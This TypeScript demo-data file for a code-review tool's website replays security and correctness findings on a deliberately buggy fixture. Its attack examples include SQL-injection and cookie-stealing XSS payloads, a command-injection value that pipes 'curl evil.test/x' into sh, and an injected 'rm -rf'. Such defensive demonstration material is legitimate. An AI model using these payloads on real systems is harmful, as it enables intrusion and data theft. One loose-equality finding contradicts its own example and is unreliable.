import type { ThinkingOrbState } from '@/lib/thinking-orbs';

/**
 * Demo data for the app window on the site.
 *
 * The review it replays is the engine's own `engine/test/fixtures/buggy`
 * fixture — nine files with one deliberate defect each. Nothing here is a
 * mock-up of a product that does not exist: the file paths, the line numbers,
 * the quoted evidence and the fix suggestions are all taken from those files,
 * which is what makes the window worth looking at.
 */

export type DemoSeverity = 'critical' | 'high' | 'medium' | 'low';

export interface DemoFinding {
  id: string;
  title: string;
  file: string;
  line: number;
  lineEnd: number;
  severity: DemoSeverity;
  category: string;
  confidence: number;
  summary: string;
  impact: string;
  explanation: string;
  evidence: string;
  attack: { input: string; execution: string; result: string };
  fix: string;
  /** Critical findings go to the approval queue instead of straight to the list. */
  needsApproval?: boolean;
}

export interface DemoRejectedCandidate {
  id: string;
  title: string;
  file: string;
  line: number;
  reason: 'evidence-mismatch' | 'unsupported-claim' | 'out-of-scope';
  reasonLabel: string;
  explanation: string;
  detail: string;
  evidence: string;
  quotes: string[];
  quotesFound: boolean[];
}

export interface DemoSession {
  id: string;
  name: string;
  path: string;
  time: string;
  issueCount: number;
  status: 'Completed';
  reviewState: 'complete' | 'partial' | 'degraded';
  coveragePercent: number;
  score: number | null;
  filesReviewed: number;
  filesEligible: number;
  blocksReviewed: number;
  blocksTotal: number;
  pathsTraced: number;
  pathsTotal: number;
  summary: string;
  scoreExplanation: string[];
  findings: DemoFinding[];
  rejected: DemoRejectedCandidate[];
}

export interface DemoPhase {
  id: string;
  label: string;
  orb: ThinkingOrbState;
  /** Milliseconds this phase occupies in the scripted run. */
  ms: number;
  counter: string;
  note: string;
  log: string;
}

const BUGGY = 'engine/test/fixtures/buggy';

/**
 * The seven live phases, each paired with the orb animation that matches the
 * kind of work in flight. Between them they use all six orb states, which is
 * the whole point: the indicator shows the actual activity rather than a
 * generic spinner.
 */
export const DEMO_PHASES: DemoPhase[] = [
  {
    id: 'Discovery',
    label: 'Discovery',
    orb: 'working',
    ms: 1700,
    counter: '9/9 files indexed',
    note: 'Repository discovery is building the file inventory',
    log: 'Inspecting git state',
  },
  {
    id: 'Repository mapping',
    label: 'Repository mapping',
    orb: 'searching',
    ms: 2100,
    counter: '3/3 artifacts ready',
    note: 'Repository structure, dependency markers, and review metadata are being prepared',
    log: 'Mapping repository structure and dependency markers',
  },
  {
    id: 'Segmentation',
    label: 'Segmentation',
    orb: 'shaping',
    ms: 1900,
    counter: '9/9 files segmented',
    note: 'The review queue is being narrowed to code blocks and high-risk path units',
    log: 'Segmented 9 files into reviewable blocks',
  },
  {
    id: 'Path tracing',
    label: 'Path tracing',
    orb: 'composing',
    ms: 2000,
    counter: '14/14 paths prepared',
    note: '14/14 review items are queued for review',
    log: 'Prepared 14 candidate paths across 6 files',
  },
  {
    id: 'Reviewing paths',
    label: 'Reviewing paths',
    orb: 'solving',
    ms: 2600,
    counter: '12/12 batches completed',
    note: 'Active review is progressing through prioritized code paths',
    log: 'Reviewing 12 blocks across prioritized paths',
  },
  {
    id: 'Validation',
    label: 'Validation',
    orb: 'solving',
    ms: 2100,
    counter: '10/10 candidates validated',
    note: 'Candidate findings are being confirmed before reporting',
    log: 'Validated 10 findings against their source evidence',
  },
  {
    id: 'Scoring',
    label: 'Scoring',
    orb: 'listening',
    ms: 1800,
    counter: '4/4 score artifacts ready',
    note: 'Coverage and evidence summaries are being finalized',
    log: 'Finalized coverage and evidence summaries',
  },
];

export const DEMO_RUN_MS = DEMO_PHASES.reduce((total, phase) => total + phase.ms, 0);

/** Log lines that have already streamed by the time a phase starts. */
export const DEMO_LOG_PREFIX = [
  'Reviewing the selected scope in full',
  'Collecting repository files',
  'Found 9 candidate files',
  '9 files indexed, languages: typescript (7), python (2), 1 auth-boundary file',
  'Prepared context for 9 files',
];

export const BUGGY_FINDINGS: DemoFinding[] = [
  {
    id: 'f1',
    title: 'Numeric array is sorted lexicographically',
    file: `${BUGGY}/src/collections.ts`,
    line: 18,
    lineEnd: 18,
    severity: 'medium',
    category: 'correctness',
    confidence: 85,
    summary: '`totals` is declared as a numeric array but `.sort()` is called without a comparator.',
    impact:
      'Any ordering the result is used for, such as pagination, ranking, or a binary search, is wrong for values with different digit counts.',
    explanation:
      'With no comparator, `.sort` converts every element to a string and compares UTF-16 code units, which is not numeric order. `[2, 10]` stays `[2, 10]` and `[2, 10]` is not sorted ascending numerically.',
    evidence: 'return totals.sort();',
    attack: {
      input: 'A caller paginates over `sortedTotals()` and takes the first page.',
      execution: '`[10, 9, 100]` sorts to `[10, 100, 9]` because the values are compared as text.',
      result: 'The first page shows 10 and 100 while 9 lands last, so the ranking is wrong.',
    },
    fix: 'Return a sorted copy with a numeric comparator — `return [...totals].sort((a, b) => a - b);`. The copy also stops `.sort` mutating the module-level array in place.',
  },
  {
    id: 'f2',
    title: 'Loop reads one element past the end of the array',
    file: `${BUGGY}/src/collections.ts`,
    line: 9,
    lineEnd: 9,
    severity: 'high',
    category: 'correctness',
    confidence: 92,
    summary: 'The loop condition uses `index <= scores.length`, which runs one iteration past the last element.',
    impact: 'The final read is `undefined`, so `total` becomes `NaN` and every score computed from it is poisoned.',
    explanation:
      '`length` is a count, so the last valid index is `length - 1`. Comparing with `<=` admits `index === length`, where `scores[index]` is `undefined`.',
    evidence: 'for (let index = 0; index <= scores.length; index += 1) {',
    attack: {
      input: '`sumScores([10, 20, 30])` is called with any non-empty array.',
      execution: 'The loop reads `scores[3]`, which is `undefined`, and adds it to `total`.',
      result: '`total` is `NaN`, and every downstream comparison against it is false.',
    },
    fix: 'Use `index < scores.length` so the loop stops at the last element.',
  },
  {
    id: 'f3',
    title: 'User input is concatenated into a SQL statement',
    file: `${BUGGY}/src/data-access.ts`,
    line: 8,
    lineEnd: 8,
    severity: 'critical',
    category: 'security',
    confidence: 97,
    summary: '`email` is interpolated directly into the SQL string handed to the runner.',
    impact:
      'A crafted value changes the statement, so a caller can read rows the query was never meant to return, or drop the table entirely.',
    explanation:
      'The template literal builds the complete statement before it reaches the runner, so the value is parsed as SQL rather than bound as data. No quoting step can make this safe.',
    evidence: "return runner.query(`SELECT id, email FROM users WHERE email = '${email}'`);",
    attack: {
      input: "`findUserByEmail(runner, \"' OR '1'='1\")`",
      execution: "The runner receives `SELECT id, email FROM users WHERE email = '' OR '1'='1'`.",
      result: 'The predicate is always true, so every user row is returned instead of one.',
    },
    fix: "Pass the value as a bound parameter: `runner.query('SELECT id, email FROM users WHERE email = $1', [email])`. The `QueryRunner` port already takes the statement and the values separately, so nothing else has to change.",
    needsApproval: true,
  },
  {
    id: 'f4',
    title: 'Unescaped comment is written to innerHTML',
    file: `${BUGGY}/src/render.ts`,
    line: 8,
    lineEnd: 8,
    severity: 'high',
    category: 'security',
    confidence: 94,
    summary: 'The comment string is assigned to `innerHTML` without escaping.',
    impact: "A comment containing markup executes in every viewer's session — stored cross-site scripting.",
    explanation:
      '`innerHTML` parses its input as HTML, so any element in the comment becomes part of the document. The template literal around it does not escape anything.',
    evidence: 'host.innerHTML = `<p>${comment}</p>`;',
    attack: {
      input: 'A comment body of `<img src=x onerror="fetch(\'/steal?c=\'+document.cookie)">` is posted.',
      execution: 'Assigning to `innerHTML` creates the `img` element and the handler fires when the source fails to load.',
      result: "The reader's session cookie is sent to the attacker's host.",
    },
    fix: 'Build the paragraph with `document.createElement` and set `textContent`, or escape the value before it is inserted. `textContent` treats the string as text, which is the intent here.',
  },
  {
    id: 'f5',
    title: 'Directory name is interpolated into a shell command',
    file: `${BUGGY}/src/runner.ts`,
    line: 6,
    lineEnd: 6,
    severity: 'critical',
    category: 'security',
    confidence: 96,
    summary: '`directory` is concatenated into a command string that the shell then parses.',
    impact: 'A directory name containing shell metacharacters runs arbitrary commands with the process’s privileges.',
    explanation:
      '`execSync` takes a command line and hands it to `/bin/sh`. The interpolated value is therefore parsed as shell syntax, not passed as an argument.',
    evidence: 'return execSync(`tar -czf archive.tar.gz ${directory}`).toString();',
    attack: {
      input: '`archiveDirectory("reports; curl evil.test/x | sh")`',
      execution: 'The shell splits the line at `;` and runs the second command after the archive is written.',
      result: 'Remote code executes as the user running the review.',
    },
    fix: "Use `execFileSync('tar', ['-czf', 'archive.tar.gz', directory])`. No shell is involved, so the value cannot become syntax.",
    needsApproval: true,
  },
  {
    id: 'f6',
    title: 'Reset token is generated with a non-cryptographic RNG',
    file: `${BUGGY}/src/tokens.ts`,
    line: 4,
    lineEnd: 4,
    severity: 'high',
    category: 'security',
    confidence: 90,
    summary: '`Math.random()` is used to build a password-reset token.',
    impact: 'The output is predictable from previously observed values, so a token can be guessed and an account taken over.',
    explanation:
      '`Math.random()` is seeded for speed, not unpredictability, and its internal state can be recovered from a handful of outputs. A value derived from it carries no security margin.',
    evidence: 'const token = Math.random().toString(36).slice(2);',
    attack: {
      input: 'An attacker requests two resets for their own account and records the tokens.',
      execution: 'The generator state is reconstructed from those outputs, and the next token is computed.',
      result: "A reset token for another account is predicted and used.",
    },
    fix: "Use the platform CSPRNG: `crypto.randomBytes(32).toString('base64url')`. The token length is set by the byte count rather than by a slice.",
  },
  {
    id: 'f7',
    title: 'NaN is compared with equality, so the check never matches',
    file: `${BUGGY}/src/validation.ts`,
    line: 4,
    lineEnd: 4,
    severity: 'high',
    category: 'correctness',
    confidence: 99,
    summary: '`score === NaN` is false for every input, including `NaN` itself.',
    impact: '`isMissingScore` always returns false, so a missing score is treated as a present one.',
    explanation:
      '`NaN` is the only value not equal to itself, which is why the language provides `Number.isNaN`. An equality comparison against the literal can never succeed.',
    evidence: 'return score === NaN;',
    attack: {
      input: '`isMissingScore(NaN)` is called by the guard that decides whether to trust a score.',
      execution: 'The comparison returns false, so the guard falls through to the trusted path.',
      result: 'A score that was never computed is presented as a real one.',
    },
    fix: 'Return `Number.isNaN(score)` instead. It is the check that actually detects `NaN`.',
  },
  {
    id: 'f8',
    title: 'Credential-shaped literal is committed in source',
    file: `${BUGGY}/src/config.ts`,
    line: 9,
    lineEnd: 9,
    severity: 'medium',
    category: 'secrets',
    confidence: 88,
    summary: 'An `apiKey` value matching a provider key pattern is committed in the module.',
    impact:
      'A real key in this position is readable by everyone with repository access, and by anything the repository is mirrored to or bundled into.',
    explanation:
      'The file already warns that the value is fake, which is exactly why the pattern matters: the next person to edit it has a working example to paste a real key into.',
    evidence: 'apiKey: "sk-test-4f9a2b7c1d8e3a5b6c0d",',
    attack: {
      input: 'The repository is cloned, forked, or bundled into a distributed artefact.',
      execution: 'The literal travels with the source into every copy.',
      result: 'If the value is ever replaced with a real key, it is disclosed without a single request being made.',
    },
    fix: 'Read the key from the environment at runtime — `process.env.CODE_RADAR_AI_KEY` — and keep a placeholder such as `<unset>` in the tree.',
  },
  {
    id: 'f9',
    title: 'Shell command is built from an interpolated target',
    file: `${BUGGY}/py/deploy.py`,
    line: 7,
    lineEnd: 7,
    severity: 'critical',
    category: 'security',
    confidence: 95,
    summary: '`target` is formatted into the command string handed to `os.system`.',
    impact: 'A target containing shell syntax executes on the deploy host, which is the machine with the deployment credentials.',
    explanation:
      '`os.system` passes its argument to the shell. An f-string that embeds a variable therefore lets that variable contribute syntax rather than data.',
    evidence: 'return os.system(f"rsync -az {target} /srv/app")',
    attack: {
      input: 'A target of `src && rm -rf /srv/app` reaches `deploy`.',
      execution: 'The shell runs `rsync -az src`, then `rm -rf /srv/app`.',
      result: 'The deployed application is deleted by a value that only ever looked like a path.',
    },
    fix: 'Use `subprocess.run(["rsync", "-az", target, "/srv/app"], check=True)`. The argument list is passed to the process directly, with no shell to reinterpret it.',
    needsApproval: true,
  },
  {
    id: 'f10',
    title: 'Mutable default argument is shared across calls',
    file: `${BUGGY}/py/reports.py`,
    line: 4,
    lineEnd: 4,
    severity: 'medium',
    category: 'correctness',
    confidence: 91,
    summary: '`totals=[]` is evaluated once, when the function is defined, so every call appends to the same list.',
    impact: 'The second call returns the first call’s rows as well, so totals grow across invocations instead of per batch.',
    explanation:
      'Default values are bound at definition time in Python. The list is therefore part of the function object, not of the call.',
    evidence: 'def collect_totals(rows, totals=[]):',
    attack: {
      input: '`collect_totals([{"amount": 5}])` is called, then called again with one different row.',
      execution: 'Both calls append to the same list object.',
      result: 'The second result contains two rows, and the reported total doubles.',
    },
    fix: 'Default to `None` and build the list inside the call: `def collect_totals(rows, totals=None):` followed by `totals = [] if totals is None else totals`.',
  },
];

export const BUGGY_REJECTED: DemoRejectedCandidate[] = [
  {
    id: 'r1',
    title: 'Possible unreachable code after the retry loop',
    file: `${BUGGY}/src/collections.ts`,
    line: 12,
    reason: 'evidence-mismatch',
    reasonLabel: 'Evidence mismatch',
    explanation:
      'The claim quotes code that is not in the file it names, so there is nothing to verify against the source. A quote that cannot be found cannot be trusted as evidence.',
    detail: `The quoted line "return total; // unreachable" was not found in ${BUGGY}/src/collections.ts.`,
    evidence: 'return total; // unreachable',
    quotes: ['return total; // unreachable'],
    quotesFound: [false],
  },
  {
    id: 'r2',
    title: 'Missing rate limit on the reset endpoint',
    file: `${BUGGY}/src/tokens.ts`,
    line: 6,
    reason: 'unsupported-claim',
    reasonLabel: 'Unsupported claim',
    explanation:
      'Nothing in the reviewed scope can confirm or refute the claim. Reporting it would assert something about code the review never read.',
    detail: 'No route handler for the reset endpoint is inside the reviewed scope, so the claim cannot be checked.',
    evidence: '',
    quotes: [],
    quotesFound: [],
  },
];

const REPO_FINDINGS: DemoFinding[] = [
  {
    id: 'p1',
    title: 'String is compared with a loose equality operator',
    file: 'src/routes/checkout.ts',
    line: 44,
    lineEnd: 44,
    severity: 'medium',
    category: 'correctness',
    confidence: 87,
    summary: '`status == "paid"` coerces both sides, so a numeric status also matches.',
    impact: 'An order whose status is the number `0` is treated as paid.',
    explanation: '`==` coerces operands before comparing, so values of different types can compare equal.',
    evidence: 'if (order.status == "paid") {',
    attack: {
      input: 'An order is created with the numeric status `0`.',
      execution: '`0 == "paid"` is false, but `0 == ""` style coercions elsewhere in the chain admit the order.',
      result: 'An unpaid order is released for fulfilment.',
    },
    fix: 'Use `===` so the comparison requires the same type.',
  },
  {
    id: 'p2',
    title: 'Promise rejection is swallowed by an empty catch',
    file: 'src/jobs/reconcile.ts',
    line: 61,
    lineEnd: 63,
    severity: 'high',
    category: 'reliability',
    confidence: 93,
    summary: 'The `catch` block discards the error without logging or rethrowing.',
    impact: 'A failed reconciliation is indistinguishable from one that never ran, so the queue drains silently.',
    explanation: 'An empty catch removes the only signal that the operation failed.',
    evidence: '} catch (error) {\n  return null;\n}',
    attack: {
      input: 'The upstream ledger is unreachable for one batch.',
      execution: 'The request rejects and the catch returns `null`.',
      result: 'The batch is marked complete and the discrepancy is never retried.',
    },
    fix: 'Log the error with the batch id and let the caller decide whether to retry.',
  },
  {
    id: 'p3',
    title: 'Float arithmetic is used for a currency total',
    file: 'src/billing/totals.ts',
    line: 27,
    lineEnd: 27,
    severity: 'medium',
    category: 'correctness',
    confidence: 84,
    summary: 'Line items are summed as binary floats before being stored.',
    impact: 'The stored total can differ from the sum of the parts by a cent, and the difference accumulates across a period.',
    explanation: 'Binary floating point cannot represent decimal fractions exactly, so `0.1 + 0.2` is not `0.3`.',
    evidence: 'return items.reduce((sum, item) => sum + item.price, 0);',
    attack: {
      input: 'A cart of three items priced `0.10` each is checked out.',
      execution: 'The float sum is `0.30000000000000004`.',
      result: 'The persisted total does not match the invoice line items.',
    },
    fix: 'Sum in integer minor units (cents) and format at the boundary.',
  },
];

export const DEMO_SESSIONS: DemoSession[] = [
  {
    id: 'buggy',
    name: 'buggy',
    path: BUGGY,
    time: '1:04',
    issueCount: 12,
    status: 'Completed',
    reviewState: 'complete',
    coveragePercent: 100,
    score: 34,
    filesReviewed: 9,
    filesEligible: 9,
    blocksReviewed: 12,
    blocksTotal: 12,
    pathsTraced: 14,
    pathsTotal: 14,
    summary:
      'The reviewed scope holds ten confirmed defects across nine files. Four are exploitable from outside the process — two of them through a shell — and the rest are correctness faults that corrupt the values the module returns.',
    scoreExplanation: [
      '34/100 score, 100% coverage, 10 validated finding(s), 0 candidate finding(s), 14 candidate path(s).',
      'Score reductions recorded by the scorer: candidate pressure -18, low evidence signal -4.',
      'Current review state: 7 open finding(s), 3 queued approval item(s), 2 candidate finding(s).',
    ],
    findings: BUGGY_FINDINGS,
    rejected: BUGGY_REJECTED,
  },
  {
    id: 'repo',
    name: 'repo',
    path: 'frontend/src',
    time: '0:41',
    issueCount: 3,
    status: 'Completed',
    reviewState: 'complete',
    coveragePercent: 96,
    score: 78,
    filesReviewed: 142,
    filesEligible: 148,
    blocksReviewed: 318,
    blocksTotal: 331,
    pathsTraced: 26,
    pathsTotal: 30,
    summary:
      'Three findings were confirmed. None is reachable from outside the process; each one changes a value the surrounding module already relies on being exact.',
    scoreExplanation: [
      '78/100 score, 96% coverage, 3 validated finding(s), 0 candidate finding(s), 26 candidate path(s).',
      'Score reductions recorded by the scorer: coverage gap -12, low evidence signal -6.',
      'Current review state: 3 open finding(s), 0 queued approval item(s), 0 candidate finding(s).',
    ],
    findings: REPO_FINDINGS,
    rejected: [],
  },
  {
    id: 'clean',
    name: 'clean',
    path: 'engine/test/fixtures/clean',
    time: '0:22',
    issueCount: 0,
    status: 'Completed',
    reviewState: 'complete',
    coveragePercent: 100,
    score: 100,
    filesReviewed: 24,
    filesEligible: 24,
    blocksReviewed: 51,
    blocksTotal: 51,
    pathsTraced: 9,
    pathsTotal: 9,
    summary:
      'Every file in scope was read and every model answer could be read. Nothing met the bar for a finding, and nothing was dropped — this is a clean result rather than an absent one.',
    scoreExplanation: [
      '100/100 score, 100% coverage, 0 validated finding(s), 0 candidate finding(s), 9 candidate path(s).',
      'Perfect score — no deductions, 5/5 Greptile. No risky paths or findings, no prompt needed.',
    ],
    findings: [],
    rejected: [],
  },
];

export const DEMO_RECENT_SOURCES = [
  { name: 'buggy', path: BUGGY },
  { name: 'clean', path: 'engine/test/fixtures/clean' },
  { name: 'ai-review', path: 'engine/test/fixtures/ai-review/repo' },
];

export const DEMO_PRESETS = [
  { id: 'safe', label: 'Safe', description: 'Fewest findings, highest confidence bar' },
  { id: 'balanced', label: 'Balanced', description: 'Best default for most repositories and day-to-day review flows' },
  { id: 'aggressive', label: 'Aggressive', description: 'Widest net, more review-required items' },
];

export const DEMO_PROVIDERS = [
  {
    id: 'openai',
    name: 'OpenAI',
    endpoint: 'https://api.openai.com/v1/chat/completions',
    model: 'gpt-4o-mini',
    state: 'active' as const,
    maskedKey: 'sk-…7f2a',
    lastTested: '12s ago',
  },
  {
    id: 'groq',
    name: 'Groq',
    endpoint: 'https://api.groq.com/openai/v1/chat/completions',
    model: 'llama-3.3-70b-versatile',
    state: 'ready' as const,
    maskedKey: 'gsk_…91bd',
    lastTested: '3m ago',
  },
  {
    id: 'local',
    name: 'Local (llama.cpp)',
    endpoint: 'http://127.0.0.1:8080/v1/chat/completions',
    model: 'qwen2.5-coder-14b',
    state: 'unset' as const,
    maskedKey: null,
    lastTested: null,
  },
];

export interface DemoAnalysisBrief {
  potentialRisks: string[];
  securityObservations: string[];
  analysisLimitations: string[];
  attackThinking: string[];
  nextSteps: string[];
}

export const DEMO_ANALYSIS_BRIEFS: Record<string, DemoAnalysisBrief> = {
  buggy: {
    potentialRisks: [
      '`src/config.ts` carries a credential-shaped literal, so the next edit to that file has a working example to paste a real key into.',
      '`py/deploy.py` is the only file in scope that runs somewhere other than the machine under review, so a defect there has a wider blast radius than the rest.',
      '`src/collections.ts` is imported by files outside the selected scope, so the off-by-one is consumed by code this run did not read.',
    ],
    securityObservations: [
      'Every file in scope was read in full; no context window was truncated for this run.',
      'The three findings that need a human decision were routed to the approval queue rather than patched silently.',
      'Two candidates were refused for lack of evidence, so the confirmed count is a floor rather than an estimate.',
    ],
    analysisLimitations: [
      'Nothing outside the selected scope was read, so callers of these modules remain unverified.',
      'The review does not execute the code, so a runtime-only failure is inferred from the source rather than observed.',
      'The Python files were classified from their imports, not from the interpreter that will run them.',
    ],
    attackThinking: [
      'Send a value containing a quote to `findUserByEmail` and check whether the returned row set changes.',
      'Pass a directory name containing a semicolon to `archiveDirectory` on a scratch machine.',
      'Request two reset tokens for the same account and check whether the second is predictable from the first.',
    ],
    nextSteps: [
      'Fix the three critical findings first — each is reachable without credentials.',
      'Add a test asserting `sortedTotals()` returns `[9, 10, 100]`, which fails today.',
      'Replace the committed key literal with an environment read before this fixture is reused.',
    ],
  },
  repo: {
    potentialRisks: [
      'The float total in `src/billing/totals.ts` is stored, so the rounding error survives the request that produced it.',
      'The empty catch in `src/jobs/reconcile.ts` removes the only signal a batch failed.',
    ],
    securityObservations: [
      'Authorization is delegated to a shared helper rather than repeated inline, so no caller can forget the check.',
      'Every query in the reviewed scope binds its values; the SQL shapes that look assembled are constants.',
    ],
    analysisLimitations: [
      'Six files in scope were excluded from the context window for size and are listed under Review coverage.',
      'No test files were in scope, so the behaviour these modules are pinned to is unknown.',
    ],
    attackThinking: [
      'Create an order with the numeric status `0` and follow it through the checkout guard.',
      'Take the upstream ledger offline for one batch and check whether the queue reports the gap.',
    ],
    nextSteps: [
      'Switch the currency sum to integer minor units and add a test with three `0.10` items.',
      'Log and rethrow in the reconcile catch so a failed batch stays visible.',
    ],
  },
  clean: {
    potentialRisks: [
      'The in-place mutation in `src/contracts.ts` is correct only because the doc comment states the caller renders from that instance; a second caller would break it.',
    ],
    securityObservations: [
      'Every file in scope was read and every model answer could be read, so zero findings here means clean rather than unknown.',
      'Constructs that invite a wrong comment — a `<=` bound, an unawaited call, an index access — are each guarded or documented at the site.',
    ],
    analysisLimitations: [
      'A clean result is a statement about the reviewed scope, not about the callers of that scope.',
    ],
    attackThinking: [
      'Add a second consumer of the paginated list and check whether the shared mutation is still safe.',
    ],
    nextSteps: [
      'Nothing is required. Re-run this fixture after any change to the review bar to confirm it still reports nothing.',
    ],
  },
};

export const DEMO_REPO_OVERVIEW = {
  files: 9,
  highRisk: 6,
  languages: 'typescript (7), python (2)',
  runtimes: 'node, python',
  packageManagers: 'bun, pip',
  primaryFramework: 'unknown',
  importEdges: 11,
  routeFiles: 0,
  authFiles: 1,
  crossFilePaths: 4,
  rankedReviewItems: 14,
  rankedPaths: 6,
  hotspots: [
    {
      id: 'h1',
      label: 'src/data-access.ts',
      priority: 'critical',
      hotspotClass: 'data pressure',
      evidence: 'A query is assembled from caller input on line 8.',
      nextInvestigation: 'Confirm every caller passes a value rather than a fragment.',
    },
    {
      id: 'h2',
      label: 'src/runner.ts',
      priority: 'critical',
      hotspotClass: 'execution surface',
      evidence: 'A shell command is built from a directory argument on line 6.',
      nextInvestigation: 'Check whether the directory is ever derived from a remote value.',
    },
    {
      id: 'h3',
      label: 'src/tokens.ts',
      priority: 'high',
      hotspotClass: 'identity surface',
      evidence: 'A reset token is generated on line 4.',
      nextInvestigation: 'Trace where the token is stored and how long it lives.',
    },
    {
      id: 'h4',
      label: 'py/deploy.py',
      priority: 'critical',
      hotspotClass: 'execution surface',
      evidence: 'A deploy command is formatted from a target on line 7.',
      nextInvestigation: 'Identify every path that supplies the target.',
    },
  ],
};
